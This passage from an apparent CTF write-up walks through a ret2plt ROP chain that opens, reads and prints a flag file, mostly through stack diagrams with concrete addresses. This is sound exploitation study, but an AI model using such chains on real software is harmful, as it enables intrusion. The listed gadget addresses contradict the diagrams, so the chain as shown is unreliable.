        0x000000000040037c - 0x000000000040039c is .note.ABI-tag
        0x00000000004003a0 - 0x00000000004003c8 is .gnu.hash
        0x00000000004003c8 - 0x0000000000400590 is .dynsym
        0x0000000000400590 - 0x0000000000400653 is .dynstr
        0x0000000000400654 - 0x000000000040067a is .gnu.version
        0x0000000000400680 - 0x00000000004006a0 is .gnu.version_r
        0x00000000004006a0 - 0x0000000000400700 is .rela.dyn
        0x0000000000400700 - 0x0000000000400850 is .rela.plt
        0x0000000000401000 - 0x000000000040101b is .init
        0x0000000000401020 - 0x0000000000401110 is .plt
        0x0000000000401110 - 0x00000000004011f0 is .plt.sec
        0x00000000004011f0 - 0x00000000004024f5 is .text
        0x00000000004024f8 - 0x0000000000402505 is .fini
        0x0000000000403000 - 0x0000000000403388 is .rodata
        0x0000000000403388 - 0x0000000000403404 is .eh_frame_hdr
        0x0000000000403408 - 0x00000000004035f0 is .eh_frame
        0x0000000000404e00 - 0x0000000000404e08 is .init_array
        0x0000000000404e08 - 0x0000000000404e10 is .fini_array
        0x0000000000404e10 - 0x0000000000404ff0 is .dynamic
        0x0000000000404ff0 - 0x0000000000405000 is .got
        0x0000000000405000 - 0x0000000000405088 is .got.plt
        0x0000000000405088 - 0x0000000000405098 is .data
        0x00000000004050a0 - 0x00000000004050f8 is .bss
```

- [x] Offset between buffer and stored return address to `main()`: `88`
   - Buffer address: `0x7ffcd4fe1ae0`
   - location of the stored return pointer to `main()`: `0x7ffcd4fe1b38`
- [x] Location of a NULL terminated string: `0x403386`
- [x] Locations of required PLT stubs
   - `open@plt`: `0x4011d0`
   - `read@plt`: `0x401160`
   - `puts@plt`: `0x401130`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [x] Location to which flag is to be read: `0x405100`

### ROP chain: ret2plt

This is the ROP chain that we will be performing.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffcd4fe1ae0 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b30 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffcd4fe1b38 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b40 │  00 00 00 00 00 40 33 86  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b48 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b50 │  00 00 00 00 00 00 00 00  │ ( 0 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b58 │  00 00 00 00 00 40 11 d0  │ --> ( open@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b60 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b68 │  00 00 00 00 00 00 00 03  │ ( 3 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b70 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b40 │  00 00 00 00 00 40 33 86  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b48 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b50 │  00 00 00 00 00 00 00 00  │ ( 0 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b58 │  00 00 00 00 00 40 11 d0  │ --> ( open@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b60 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b68 │  00 00 00 00 00 00 00 03  │ ( 3 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b70 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b48 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b50 │  00 00 00 00 00 00 00 00  │ ( 0 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b58 │  00 00 00 00 00 40 11 d0  │ --> ( open@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b60 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b68 │  00 00 00 00 00 00 00 03  │ ( 3 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b70 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386

Function call setup:
open("!")

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b50 │  00 00 00 00 00 00 00 00  │ ( 0 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b58 │  00 00 00 00 00 40 11 d0  │ --> ( open@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b60 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b68 │  00 00 00 00 00 00 00 03  │ ( 3 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b70 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386

Function call setup:
open("!")

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b58 │  00 00 00 00 00 40 11 d0  │ --> ( open@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b60 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b68 │  00 00 00 00 00 00 00 03  │ ( 3 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b70 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386
rsi: 0

Function call setup:
open("!", O_RDONLY)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b60 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b68 │  00 00 00 00 00 00 00 03  │ ( 3 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b70 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386
rsi: 0

Function call setup:
open("!", O_RDONLY)

═══════════════════════════════════════════════════════════════════════════════════
rip --> open("!", O_RDONLY)
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b60 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b68 │  00 00 00 00 00 00 00 03  │ ( 3 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b70 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386
rsi: 0

Function call setup:
open("!", O_RDONLY)

═══════════════════════════════════════════════════════════════════════════════════
rip --> open() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b68 │  00 00 00 00 00 00 00 03  │ ( 3 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b70 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b70 │  00 00 00 00 00 40 22 96  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 3

Function call setup:
read(3)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b78 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 3

Function call setup:
read(3)

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b80 │  00 00 00 00 00 40 22 8e  │ --> ( pop rdx ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba0 │  00 00 00 00 00 40 51 00  │ --> ( location in .bss )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1ba8 │  00 00 00 00 00 40 11 30  │ --> ( puts@plt )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 3
rsi: 0x405100

Function call setup:
read(3, 0x405100)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffcd4fe1b88 │  00 00 00 00 00 00 00 64  │ ( 100 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b90 │  00 00 00 00 00 40 11 60  │ --> ( read@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffcd4fe1b98 │  00 00 00 00 00 40 22 96  │ --> ( pop rdi ; ret )
